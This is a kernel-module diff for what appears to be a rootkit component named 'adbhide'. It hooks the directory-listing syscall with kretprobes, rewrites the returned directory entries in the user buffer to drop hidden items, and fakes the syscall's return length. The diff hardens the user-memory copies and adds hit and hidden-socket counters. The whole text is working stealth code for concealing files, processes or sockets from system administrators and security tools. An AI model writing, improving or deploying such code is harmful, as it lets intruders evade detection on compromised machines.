@@ -210,6 +210,8 @@ static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 	d->buf = (void __user *)regs_get_kernel_argument(regs, 1);
 	d->count = (unsigned int)regs_get_kernel_argument(regs, 2);
 	d->hit = d->buf && d->count >= 32 && d->count <= 262144;
+	if (d->hit)
+		adbhide_event_add("gd", "hit");
 	return 0;
 }
 
@@ -227,9 +229,16 @@ static int gd_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
 	tmp = kmalloc(n, GFP_ATOMIC);
 	if (!tmp)
 		return 0;
-	if (copy_from_user(tmp, d->buf, n)) {
-		kfree(tmp);
-		return 0;
+	{
+		unsigned long left;
+
+		pagefault_disable();
+		left = raw_copy_from_user(tmp, d->buf, n);
+		pagefault_enable();
+		if (left) {
+			kfree(tmp);
+			return 0;
+		}
 	}
 
 	while (off + 19 <= n) {
@@ -248,8 +257,17 @@ static int gd_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
 		out += reclen;
 		off += reclen;
 	}
-	if (changed && !copy_to_user(d->buf, tmp, out))
-		regs_set_return_value(regs, out);
+	if (changed) {
+		unsigned long left;
+
+		pagefault_disable();
+		left = raw_copy_to_user(d->buf, tmp, out);
+		pagefault_enable();
+		if (!left) {
+			regs_set_return_value(regs, out);
+			adbhide_counter_bump(CNT_SOCK_HIDDEN);
+		}
+	}
 	kfree(tmp);
 	return 0;
 }
